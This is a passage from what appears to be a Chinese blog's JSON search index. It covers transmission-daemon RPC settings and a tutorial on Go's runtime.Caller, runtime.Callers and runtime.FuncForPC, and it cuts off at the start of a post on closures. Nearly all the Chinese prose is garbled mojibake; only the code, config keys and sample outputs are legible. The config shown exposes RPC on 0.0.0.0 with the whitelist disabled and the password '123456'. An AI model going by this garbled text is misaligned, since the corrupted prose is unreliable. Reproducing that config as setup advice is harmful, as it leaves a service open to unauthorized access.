é…ç½®ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘çš„åŸå§‹æ–‡ä»¶æ˜¯/etc/transmission-daemon/settings.jsonã€‚é‡Œé¢çš„å‚æ•°è§£é‡Šå¯ä»¥å‚è€ƒå®˜ç½‘çš„é…ç½®è¯´æ˜ã€‚\n- torrents/ï¼š ç”¨æˆ·å­˜æ”¾.torrentç§å­æ–‡ä»¶çš„ç›®å½•,å‡¡æ˜¯æ·»åŠ åˆ°ä¸‹è½½ä»»åŠ¡çš„ç§å­ï¼Œéƒ½å­˜æ”¾åœ¨è¿™é‡Œã€‚.torrentçš„å‘½ååŒ…å«,ç§å­æ–‡ä»¶æœ¬èº«çš„åå­—å’Œç§å­çš„SHA1 HASHå€¼ã€‚\n- resume/ï¼š è¯¥å­˜æ”¾äº†.resumeæ–‡ä»¶ï¼Œ.resumeæ–‡ä»¶åŒ…å«äº†ä¸€ä¸ªç§å­çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è¯¥æ–‡ä»¶å“ªäº›éƒ¨åˆ†è¢«ä¸‹è½½äº†ï¼Œä¸‹è½½çš„æ•°æ®å­˜å‚¨çš„ä½ç½®ç­‰ç­‰ã€‚\n- blocklists/ï¼š å­˜å‚¨è¢«å±è”½çš„peerçš„åœ°å€ã€‚\n- dht.datï¼š å­˜å‚¨DHTèŠ‚ç‚¹ä¿¡æ¯ã€‚\n\n\n\né…ç½®ä¸»è¦æ˜¯é€šè¿‡ä¿®æ”¹Â `/var/lib/transmission-daemon/info/settings.json`Â æ–‡ä»¶ä¸­çš„å‚æ•°æ¥å®ç°çš„ã€‚ **æ³¨æ„**ï¼šåœ¨ç¼–è¾‘ transmission é…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦å…ˆå…³é—­ daemon è¿›ç¨‹ï¼Œå¦åˆ™ç¼–è¾‘çš„å‚æ•°å°†ä¼šè¢«æ¢å¤åˆ°åŸæ¥çš„çŠ¶æ€ã€‚\n\n\n\n2. RPCå‚æ•°ä»‹ç»: \n\n```\n{\n\"download-dir\": \"/down\", #ä¸‹è½½ç›®å½•çš„ç»å¯¹è·¯å¾„\n\"incomplete-dir\": \"/down/temp\", #ä¸´æ—¶æ–‡ä»¶è·¯å¾„\n\"rpc-authentication-required\": true, #å¯ç”¨éªŒè¯\n\"rpc-bind-address\": \"0.0.0.0\", #å…è®¸ä»»ä½•IPé€šè¿‡RPCåè®®è®¿é—®\n\"rpc-enabled\": true, #å…è®¸é€šè¿‡RPCè®¿é—®\n\"rpc-password\": \"123456\", #RPCéªŒè¯å¯†ç ï¼ˆä¿å­˜å¹¶å¯åŠ¨ådaemonä¼šè®¡ç®—å¹¶æ›¿æ¢ä¸ºHASHå€¼ä»¥å¢åŠ å®‰å…¨æ€§ï¼‰\n\"rpc-port\": 9091, #RPCç«¯å£\n\"rpc-username\": \"transmission\", #RPCéªŒè¯ç”¨æˆ·å\n\"rpc-whitelist\": \"*\", #RPCè®¿é—®ç™½åå•\n\"rpc-whitelist-enabled\": false, #å…³é—­ç™½åå•åŠŸèƒ½ä»¥ä¾¿å…¬ç½‘è®¿é—®\n}\n```\n\næ›´å¤šå‚æ•°è¯´æ˜è¯·è§[å®˜æ–¹Wiki](https://github.com/transmission/transmission/wiki/Editing-Configuration-Files)\n\n\n\n### 4. macä½¿ç”¨webç•Œé¢æ§åˆ¶transmission daemon\n\n\n\n+ è¿è¡ŒXcode ç¼–è¯‘å¥½çš„å®¢æˆ·ç«¯, è®¾ç½® Remote\n\n\n\n![2](transmission/3.png)\n\n\n\n\n\nåœ¨æµè§ˆå™¨ä¸­è®¿é—®`http://localhost:9091/transmission/web`Â å¹¶è¾“å…¥è®¾ç½®çš„ç”¨æˆ·ååŠå¯†ç å°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç•Œé¢\n\n![2](transmission/4.png)\n\n+ è¿è¡ŒXcodeç¼–è¯‘å¥½çš„transmission-daemon\n\n \n\né…ç½®æ–‡ä»¶åœ¨ `/Users/liuwei/Library/Application\\ Support/transmission-daemon/settings.json` \n\nè®¾ç½®ç¯å¢ƒå˜é‡å `export TRANSMISSION_WEB_HOME=/Users/liuwei/workspace/transmission/web`\n\né€šè¿‡æµè§ˆå™¨è®¿é—®`http://localhost:9091/transmission/web`\n\n\n\n+ è®¿é—®å¤–ç½‘ipé”™è¯¯\n\nunauthorized ip address403: ForbiddenUnauthorized IP Address.Either disable the IP address whitelist or add your address to it.If you're editing settings.json, see the 'rpc-whitelist' and 'rpc-whitelist-enabled' entries.If you're still using ACLs, use a whitelist instead. See the transmission-daemon manpage for details.\n\n\n\n```\ntransmission/.config/transmission-daemon/settings.json  \n\n\"rpc-whitelist-enabled\": true,  tureæ”¹æˆfalseã€‚\n```\n\n\n\n### 5. golangé€šè¿‡rpcè°ƒç”¨transmission\n\n\n\n+ rpc api\n\nhttps://github.com/transmission/transmission/blob/master/extras/rpc-spec.txt\n\n+ golang lib for Transmission API\n\nhttps://github.com/pyed/transmission","tags":["transmission"],"categories":["BitTorrent"]},{"title":"golang_runtimeå‡½æ•°è°ƒç”¨ä¿¡æ¯","url":"%2Fp%2F375281af.html","content":"\n\nå‡½æ•°çš„è°ƒç”¨ä¿¡æ¯æ˜¯ç¨‹åºä¸­æ¯”è¾ƒé‡è¦è¿è¡ŒæœŸä¿¡æ¯, åœ¨å¾ˆå¤šåœºåˆéƒ½ä¼šç”¨åˆ°(æ¯”å¦‚è°ƒè¯•æˆ–æ—¥å¿—)ã€‚\n\nGo è¯­è¨€ `runtime` åŒ…çš„ `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` ç­‰å‡ ä¸ªå‡½æ•°æä¾›äº†è·å–å‡½æ•°è°ƒç”¨è€…ä¿¡æ¯çš„æ–¹æ³•.\n\n \n\nè¿™å‡ ä¸ªå‡½æ•°çš„æ–‡æ¡£é“¾æ¥:\n\n- <http://golang.org/pkg/runtime/#Caller>\n\n- <http://golang.org/pkg/runtime/#Callers>\n\n- <http://golang.org/pkg/runtime/#FuncForPC>\n\n  \n\n## runtime.Callerçš„ç”¨æ³•(å¸¸ç”¨)\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.Caller(skip int) (pc uintptr, file string, line int, ok bool)\n```\n\n`runtime.Caller` è¿”å›å½“å‰ `goroutine` çš„æ ˆä¸Šçš„å‡½æ•°è°ƒç”¨ä¿¡æ¯. ä¸»è¦æœ‰å½“å‰çš„`pc` å€¼å’Œè°ƒç”¨çš„æ–‡ä»¶å’Œè¡Œå·ç­‰ä¿¡æ¯. è‹¥æ— æ³•è·å¾—ä¿¡æ¯, è¿”å›çš„ `ok` å€¼ä¸º `false`.\n\n <!-- more -->\n\nå…¶è¾“å…¥å‚æ•° `skip` ä¸ºè¦è·³è¿‡çš„æ ˆå¸§æ•°, è‹¥ä¸º `0` åˆ™è¡¨ç¤º `runtime.Caller` çš„è°ƒç”¨è€….\n\n*æ³¨æ„:ç”±äºå†å²åŸå› , runtime.Caller å’Œ runtime.Callers ä¸­çš„ skip å«ä¹‰å¹¶ä¸ç›¸åŒ, åé¢ä¼šè®²åˆ°.*\n\n\n\nä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­, æ‰“å°å‡½æ•°è°ƒç”¨çš„æ ˆå¸§ä¿¡æ¯:\n\n```\nfunc main() {\n\tfor skip := 0; skip < 3; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198453, file = caller.go, line = 10\n\t// skip = 1, pc = 4280066, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4289712, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n}\n```\n\n\n\n## runtime.Callersçš„ç”¨æ³•\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.Callers(skip int, pc []uintptr) int\n```\n\n`runtime.Callers`Â å‡½æ•°å’ŒÂ `runtime.Caller`Â å‡½æ•°è™½ç„¶åå­—ç›¸ä¼¼(å¤šä¸€ä¸ªåç¼€`s`), ä½†æ˜¯å‡½æ•°çš„å‚æ•°/è¿”å›å€¼å’Œå‚æ•°çš„æ„ä¹‰éƒ½æœ‰å¾ˆå¤§çš„å·®å¼‚.\n\n\n\n`runtime.Callers`Â æŠŠè°ƒç”¨å®ƒçš„å‡½æ•°Goç¨‹æ ˆä¸Šçš„ç¨‹åºè®¡æ•°å™¨å¡«å…¥åˆ‡ç‰‡Â `pc`Â ä¸­. å‚æ•°Â `skip`Â ä¸ºå¼€å§‹åœ¨ pc ä¸­è®°å½•ä¹‹å‰æ‰€è¦è·³è¿‡çš„æ ˆå¸§æ•°,Â **è‹¥ä¸º 0 åˆ™è¡¨ç¤ºÂ runtime.CallersÂ è‡ªèº«çš„æ ˆå¸§, è‹¥ä¸º 1 åˆ™è¡¨ç¤ºè°ƒç”¨è€…çš„æ ˆå¸§**. è¯¥å‡½æ•°è¿”å›å†™å…¥åˆ°Â `pc`Â åˆ‡ç‰‡ä¸­çš„é¡¹æ•°(å—åˆ‡ç‰‡çš„å®¹é‡é™åˆ¶).\n\n\n\nä¸‹é¢æ˜¯Â `runtime.Callers`Â çš„ä¾‹å­, ç”¨äºè¾“å‡ºæ¯ä¸ªæ ˆå¸§çš„Â `pc`Â ä¿¡æ¯:\n\n```\nfunc main() {\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4304486 4198562 4280114 4289760]\n\t// skip = 1, pc = [4198562 4280114 4289760]\n\t// skip = 2, pc = [4280114 4289760]\n\t// skip = 3, pc = [4289760]\n}\n```\n\nè¾“å‡ºæ–°çš„Â `pc`Â é•¿åº¦å’ŒÂ `skip`Â å¤§å°æœ‰é€†ç›¸å…³æ€§.Â `skip = 0`Â ä¸ºÂ `runtime.Callers`Â è‡ªèº«çš„ä¿¡æ¯.\n\nè¿™ä¸ªä¾‹å­æ¯”å‰ä¸€ä¸ªä¾‹å­å¤šè¾“å‡ºäº†ä¸€ä¸ªæ ˆå¸§, å°±æ˜¯å› ä¸ºå¤šäº†ä¸€ä¸ª `runtime.Callers` æ ˆå¸§çš„ä¿¡æ¯ (å‰ä¸€ä¸ªä¾‹å­æ˜¯æ²¡æœ‰ `runtime.Caller` ä¿¡æ¯çš„(*æ³¨æ„:æ²¡æœ‰ s åç¼€*)).\n\n\n\n## runtime.Callers å’Œ runtime.Caller çš„å¼‚åŒ\n\nå› ä¸ºå‰é¢2ä¸ªä¾‹å­ä¸ºä¸åŒçš„ç¨‹åº, è¾“å‡ºçš„ `pc` å€¼å¹¶ä¸å…·å¤‡å‚è€ƒæ€§. ç°åœ¨æˆ‘ä»¬çœ‹çœ‹åœ¨åŒä¸€ä¸ªä¾‹å­çš„è¾“å‡ºç»“æœå¦‚ä½•:\n\n \n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, file, line, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v, file = %v, line = %v\\n\", skip, pc, file, line)\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456, file = caller.go, line = 10\n\t// skip = 1, pc = 4280962, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\n\t// skip = 2, pc = 4290608, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t}\n\t// Output:\n\t// skip = 0, pc = [4305334 4198635 4280962 4290608]\n\t// skip = 1, pc = [4198635 4280962 4290608]\n\t// skip = 2, pc = [4280962 4290608]\n\t// skip = 3, pc = [4290608]\n}\n```\n\næ¯”å¦‚è¾“å‡ºç»“æœå¯ä»¥å‘ç°, `4280962` å’Œ `4290608` ä¸¤ä¸ª `pc` å€¼æ˜¯ç›¸åŒçš„. å®ƒä»¬åˆ†åˆ«å¯¹åº” `runtime.main` å’Œ `runtime.goexit` å‡½æ•°.\n\n\n\n`runtime.Caller` è¾“å‡ºçš„ `4198456` å’Œ `runtime.Callers` è¾“å‡ºçš„ `4198635` å¹¶ä¸ç›¸åŒ. è¿™æ˜¯å› ä¸º, è¿™ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨ä½ç½®å¹¶ä¸ç›¸åŒ, å› æ­¤å¯¼è‡´äº† `pc` å€¼ä¹Ÿä¸å®Œå…¨ç›¸åŒ.\n\n\n\næœ€åå°±æ˜¯ `runtime.Callers` å¤šè¾“å‡ºä¸€ä¸ª `4305334` å€¼, å¯¹åº”`runtime.Callers`å†…éƒ¨çš„è°ƒç”¨ä½ç½®.\n\nç”±äºGoè¯­è¨€(Go1.2)é‡‡ç”¨åˆ†æ®µå †æ ˆ, å› æ­¤ä¸åŒçš„ `pc` ä¹‹é—´çš„å¤§å°å…³ç³»å¹¶ä¸æ˜æ˜¾.\n\n\n\n## runtime.FuncForPC çš„ç”¨é€”\n\nå‡½æ•°çš„ç­¾åå¦‚ä¸‹:\n\n```\nfunc runtime.FuncForPC(pc uintptr) *runtime.Func\nfunc (f *runtime.Func) FileLine(pc uintptr) (file string, line int)\nfunc (f *runtime.Func) Entry() uintptr\nfunc (f *runtime.Func) Name() string\n```\n\n\n\nå…¶ä¸­ `runtime.FuncForPC` è¿”å›åŒ…å«ç»™å®š `pc` åœ°å€çš„å‡½æ•°, å¦‚æœæ˜¯æ— æ•ˆ `pc` åˆ™è¿”å› `nil` .\n\n`runtime.Func.FileLine` è¿”å›ä¸ `pc` å¯¹åº”çš„æºç æ–‡ä»¶åå’Œè¡Œå·. å®‰è£…æ–‡æ¡£çš„è¯´æ˜, å¦‚æœ`pc`ä¸åœ¨å‡½æ•°å¸§èŒƒå›´å†…, åˆ™ç»“æœæ˜¯ä¸ç¡®å®šçš„.\n\n`runtime.Func.Entry` å¯¹åº”å‡½æ•°çš„åœ°å€. \n\n`runtime.Func.Name` è¿”å›è¯¥å‡½æ•°çš„åç§°. \n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tpc, _, _, ok := runtime.Caller(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tp := runtime.FuncForPC(pc)\n\t\tfile, line := p.FileLine(0)\n\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  entry = %v\\n\", p.Entry())\n\t\tfmt.Printf(\"  name = %v\\n\", p.Name())\n\t}\n\t// Output:\n\t// skip = 0, pc = 4198456\n\t//   file = caller.go, line = 8\n\t//   entry = 4198400\n\t//   name = main.main\n\t// skip = 1, pc = 4282882\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//   entry = 4282576\n\t//   name = runtime.main\n\t// skip = 2, pc = 4292528\n\t//   file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//   entry = 4292528\n\t//   name = runtime.goexit\n\t\n\t\n\tpc := make([]uintptr, 1024)\n\tfor skip := 0; ; skip++ {\n\t\tn := runtime.Callers(skip, pc)\n\t\tif n <= 0 {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, pc = %v\\n\", skip, pc[:n])\n\t\tfor j := 0; j < n; j++ {\n\t\t\tp := runtime.FuncForPC(pc[j])\n\t\t\tfile, line := p.FileLine(0)\n\n\t\t\tfmt.Printf(\"  skip = %v, pc = %v\\n\", skip, pc[j])\n\t\t\tfmt.Printf(\"    file = %v, line = %d\\n\", file, line)\n\t\t\tfmt.Printf(\"    entry = %v\\n\", p.Entry())\n\t\t\tfmt.Printf(\"    name = %v\\n\", p.Name())\n\t\t}\n\t\tbreak\n\t}\n\t// Output:\n\t// skip = 0, pc = [4307254 4198586 4282882 4292528]\n\t//   skip = 0, pc = 4307254\n\t//     file = $(GOROOT)/src/pkg/runtime/runtime.c, line = 315\n\t//     entry = 4307168\n\t//     name = runtime.Callers\n\t//   skip = 0, pc = 4198586\n\t//     file = caller.go, line = 8\n\t//     entry = 4198400\n\t//     name = main.main\n\t//   skip = 0, pc = 4282882\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 179\n\t//     entry = 4282576\n\t//     name = runtime.main\n\t//   skip = 0, pc = 4292528\n\t//     file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n\t//     entry = 4292528\n\t//     name = runtime.goexit\n}\n```\n\n\n\næ ¹æ®æµ‹è¯•, å¦‚æœæ˜¯æ— æ•ˆÂ `pc`Â (æ¯”å¦‚`0`),Â `runtime.Func.FileLine`Â ä¸€èˆ¬ä¼šè¾“å‡ºå½“å‰å‡½æ•°çš„å¼€å§‹è¡Œå·. ä¸è¿‡åœ¨å®è·µä¸­, ä¸€èˆ¬ä¼šç”¨Â `runtime.Caller`Â è·å–æ–‡ä»¶åå’Œè¡Œå·ä¿¡æ¯,Â `runtime.Func.FileLine`Â å¾ˆå°‘ç”¨åˆ°.\n\n\n\n## å®šåˆ¶çš„ CallerName å‡½æ•°\n\nåŸºäºå‰é¢çš„å‡ ä¸ªå‡½æ•°, æˆ‘ä»¬å¯ä»¥æ–¹ä¾¿çš„å®šåˆ¶ä¸€ä¸ªÂ `CallerName`Â å‡½æ•°. å‡½æ•°Â `CallerName`Â è¿”å›è°ƒç”¨è€…çš„å‡½æ•°å/æ–‡ä»¶å/è¡Œå·ç­‰ç”¨æˆ·å‹å¥½çš„ä¿¡æ¯.\n\n\n\n```\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\tvar pc uintptr\n\tif pc, file, line, ok = runtime.Caller(skip + 1); !ok {\n\t\treturn\n\t}\n\tname = runtime.FuncForPC(pc).Name()\n\treturn\n}\n```\n\nå…¶ä¸­åœ¨æ‰§è¡Œ `runtime.Caller` è°ƒç”¨æ—¶, å‚æ•° `skip + 1` ç”¨äºæŠµæ¶ˆ `CallerName` å‡½æ•°è‡ªèº«çš„è°ƒç”¨.\n\n\n\n```\nfunc main() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v\\n\", skip)\n\t\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\t\tfmt.Printf(\"  name = %v\\n\", name)\n\t}\n\t// Output:\n\t// skip = 0\n\t//   file = caller.go, line = 19\n\t//   name = main.main\n\t// skip = 1\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 220\n\t//   name = runtime.main\n\t// skip = 2\n\t//   file = C:/go/go-tip/src/pkg/runtime/proc.c, line = 1394\n\t//   name = runtime.goexit\n}\n```\n\n\n\n## Go è¯­è¨€ä¸­å‡½æ•°çš„ç±»å‹\n\nåœ¨ Go è¯­è¨€ä¸­, é™¤äº†è¯­è¨€å®šä¹‰çš„æ™®é€šå‡½æ•°è°ƒç”¨å¤–, è¿˜æœ‰é—­åŒ…å‡½æ•°/initå‡½æ•°/å…¨å±€å˜é‡åˆå§‹åŒ–ç­‰ä¸åŒçš„å‡½æ•°è°ƒç”¨ç±»å‹.\n\nä¸ºäº†ä¾¿äºæµ‹è¯•ä¸åŒç±»å‹çš„å‡½æ•°è°ƒç”¨, æˆ‘ä»¬åŒ…è£…ä¸€ä¸ª `PrintCallerName` å‡½æ•°. è¯¥å‡½æ•°ç”¨äºè¾“å‡ºè°ƒç”¨è€…çš„ä¿¡æ¯.\n\n```\nfunc PrintCallerName(skip int, comment string) bool {\n\tname, file, line, ok := CallerName(skip + 1)\n\tif !ok {\n\t\treturn false\n\t}\n\tfmt.Printf(\"skip = %v, comment = %s\\n\", skip, comment)\n\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\tfmt.Printf(\"  name = %v\\n\", name)\n\treturn true\n}\n```\n\n\n\nç„¶åç¼–å†™ä»¥ä¸‹çš„æµ‹è¯•ä»£ç (å‡½æ•°é—­åŒ…è°ƒç”¨/å…¨å±€å˜é‡åˆå§‹åŒ–/initå‡½æ•°ç­‰):\n\n```\nvar a = PrintCallerName(0, \"main.a\")\nvar b = PrintCallerName(0, \"main.b\")\n\nfunc init() {\n\ta = PrintCallerName(0, \"main.init.a\")\n}\n\nfunc init() {\n\tb = PrintCallerName(0, \"main.init.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.init.b[1]\")\n\t}()\n}\n\nfunc main() {\n\ta = PrintCallerName(0, \"main.main.a\")\n\tb = PrintCallerName(0, \"main.main.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.main.b[1]\")\n\t\tfunc() {\n\t\t\tb = PrintCallerName(0, \"main.main.b[1][1]\")\n\t\t}()\n\t\tb = PrintCallerName(0, \"main.main.b[2]\")\n\t}()\n}\n```\n\nè¾“å‡ºç»“æœå¦‚ä¸‹:\n\n```\n// Output:\n// skip = 0, comment = main.a\n//   file = caller.go, line = 8\n//   name = main.init\n// skip = 0, comment = main.b\n//   file = caller.go, line = 9\n//   name = main.init\n// skip = 0, comment = main.init.a\n//   file = caller.go, line = 12\n//   name = main.initÂ·1\n// skip = 0, comment = main.init.b\n//   file = caller.go, line = 16\n//   name = main.initÂ·2\n// skip = 0, comment = main.init.b[1]\n//   file = caller.go, line = 18\n//   name = main.funcÂ·001\n// skip = 0, comment = main.main.a\n//   file = caller.go, line = 23\n//   name = main.main\n// skip = 0, comment = main.main.b\n//   file = caller.go, line = 24\n//   name = main.main\n// skip = 0, comment = main.main.b[1]\n//   file = caller.go, line = 26\n//   name = main.funcÂ·003\n// skip = 0, comment = main.main.b[1][1]\n//   file = caller.go, line = 28\n//   name = main.funcÂ·002\n// skip = 0, comment = main.main.b[2]\n//   file = caller.go, line = 30\n//   name = main.funcÂ·003\n```\n\n\n\nè§‚å¯Ÿè¾“å‡ºç»“æœ, å¯ä»¥å‘ç°ä»¥ä¸‹å‡ ä¸ªè§„å¾‹:\n\n- å…¨å±€å˜é‡çš„åˆå§‹åŒ–è°ƒç”¨è€…ä¸º `main.init` å‡½æ•°\n- è‡ªå®šä¹‰çš„ `init` å‡½æ•°æœ‰ä¸€ä¸ªæ•°å­—åç¼€, æ ¹æ®å‡ºç°çš„é¡ºåºè¿›ç¼–å·. æ¯”å¦‚ `main.initÂ·1` å’Œ `main.initÂ·2` ç­‰.\n- é—­åŒ…å‡½æ•°é‡‡ç”¨ `main.funcÂ·001` æ ¼å¼å‘½å, å®‰è£…é—­åŒ…å®šä¹‰ç»“æŸçš„ä½ç½®é¡ºåºè¿›ç¼–å·.\n\n \n\n## ä¸åŒ Go ç¨‹åºå¯åŠ¨æµç¨‹\n\nåŸºäºå‡½æ•°è°ƒç”¨è€…ä¿¡æ¯å¯ä»¥å¾ˆå®¹æ˜“çš„éªŒè¯å„ç§ç¯å¢ƒçš„ç¨‹åºå¯åŠ¨æµç¨‹.\n\næˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªç‹¬ç«‹çš„ `caller` ç›®å½•, é‡Œé¢æœ‰ä¸‰ä¸ªæµ‹è¯•ä»£ç .\n\n`caller/main.go` ä¸»ç¨‹åº:\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"runtime\"\n)\n\nfunc main() {\n\t_ = PrintCallerName(0, \"main.main._\")\n}\n\nfunc PrintCallerName(skip int, comment string) bool {\n\t// å®ç°å’Œå‰é¢çš„ä¾‹å­ç›¸åŒ\n}\n\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\t// å®ç°å’Œå‰é¢çš„ä¾‹å­ç›¸åŒ\n}\n```\n\n`caller/main_test.go` ä¸»ç¨‹åºçš„æµ‹è¯•æ–‡ä»¶(åŒåœ¨ä¸€ä¸ª`main`åŒ…):\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\nfunc TestPrintCallerName(t *testing.T) {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\tt.Fail()\n}\n```\n\n`caller/example_test.go` ä¸»ç¨‹åºçš„åŒ…çš„è°ƒç”¨è€…(åœ¨æ–°çš„`main_test`åŒ…):\n\n```\npackage main_test\n\nimport (\n\tmyMain \".\"\n\t\"fmt\"\n)\n\nfunc Example() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := myMain.CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\t// Output: ?\n}\n```\n\nç„¶åè¿›å…¥ `caller` ç›®å½•, è¿è¡Œ `go run test` å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„è¾“å‡ºç»“æœ:\n\n```\nskip = 0, name = caller.TestPrintCallerName, file = caller/main_test.go, line = 10\nskip = 1, name = testing.tRunner, file = $(GOROOT)/src/pkg/testing/testing.go, line = 391\nskip = 2, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n--- FAIL: TestPrintCallerName (0.00 seconds)\n--- FAIL: Example (2.0001ms)\ngot:\nskip = 0, name = caller_test.Example, file = caller/example_test.go, line = 10\n\nskip = 1, name = testing.runExample, file = $(GOROOT)/src/pkg/testing/example.go, line = 98\nskip = 2, name = testing.RunExamples, file = $(GOROOT)/src/pkg/testing/example.go, line = 36\nskip = 3, name = testing.Main, file = $(GOROOT)/src/pkg/testing/testing.go, line = 404\nskip = 4, name = main.main, file = $(TEMP)/go-build365033523/caller/_test/_testmain.go, line = 51\nskip = 5, name = runtime.main, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\nskip = 6, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\nwant:\n?\nFAIL\nexit status 1\nFAIL    caller        0.254s\n```\n\nåˆ†æè¾“å‡ºæ•°æ®æˆ‘ä»¬å¯ä»¥å‘ç°, æµ‹è¯•ä»£ç å’Œä¾‹å­ä»£ç çš„å¯åŠ¨æµç¨‹å’Œæ™®é€šçš„ç¨‹åºæµç¨‹éƒ½ä¸å¤ªä¸€æ ·.\n\n`æµ‹è¯•ä»£ç `çš„å¯åŠ¨æµç¨‹:\n\n1. `runtime.goexit` è¿˜æ˜¯å…¥å£\n2. ä½†æ˜¯ `runtime.goexit` ä¸åœ¨è°ƒç”¨ `runtime.main` å‡½æ•°, è€Œæ˜¯è°ƒç”¨ `testing.tRunner` å‡½æ•°\n3. `testing.tRunner` å‡½æ•°ç”± `go test` å‘½ä»¤ç”Ÿæˆ, ç”¨äºæ‰§è¡Œå„ä¸ªæµ‹è¯•å‡½æ•°\n\n`ä¾‹å­ä»£ç `çš„å¯åŠ¨æµç¨‹:\n\n1. `runtime.goexit` è¿˜æ˜¯å…¥å£\n2. ç„¶å `runtime.goexit` è°ƒç”¨ `runtime.main` å‡½æ•°\n3. æœ€ç»ˆ `runtime.main` **è°ƒç”¨go test å‘½ä»¤ç”Ÿæˆçš„ main.main å‡½æ•°**, åœ¨ `_test/_testmain.go` æ–‡ä»¶\n4. ç„¶åè°ƒç”¨ `testing.Main`, æ”¹å‡½æ•°æ‰§è¡Œå„ä¸ªä¾‹å­å‡½æ•°\n\nå¦å¤–, ä»è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥å‘ç°, æˆ‘ä»¬è‡ªå·±å†™çš„ `main.main` å‡½æ•°æ‰€åœ¨çš„ `main` åŒ…ä¹Ÿ å¯ä»¥è¢«å…¶ä»–åŒ…å¯¼å…¥. ä½†æ˜¯å…¶ä»–åŒ…å¯¼å…¥ä¹‹åçš„ `main` åŒ…é‡Œçš„ `main` å‡½æ•°å°±ä¸å†æ˜¯ `main.main` å‡½æ•°äº†. å› æ­¤, ç¨‹åºçš„å…¥å£ä¹Ÿå°±ä¸æ˜¯è‡ªå·±å†™çš„ `main.main` å‡½æ•°äº†.\n\n\n\n## æ€»ç»“\n\nGo è¯­è¨€ `runtime` åŒ…çš„ `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` ç­‰å‡½æ•°è™½ç„¶çœ‹èµ·æ¥æ¯”è¾ƒç®€å•, ä½†æ˜¯åŠŸèƒ½å´éå¸¸å¼ºå¤§.\n\nè¿™å‡ ä¸ªå‡½æ•°ä¸ä»…å¯ä»¥è§£å†³ä¸€äº›å®é™…çš„å·¥ç¨‹é—®é¢˜ , è€Œä¸”éå¸¸é€‚åˆç”¨äºè°ƒè¯•å’Œåˆ†æå„ç§Goç¨‹åºçš„è¿è¡Œæ—¶ä¿¡æ¯.\n","tags":["golang"],"categories":["golang"]},{"title":"golangé—­åŒ…çš„å‘","url":"%2Fp%2F4c5612cb.html","content":"\n### å¾ªç¯å†…goroutineä½¿ç”¨é—­åŒ…\n\n```\nfunc main() {    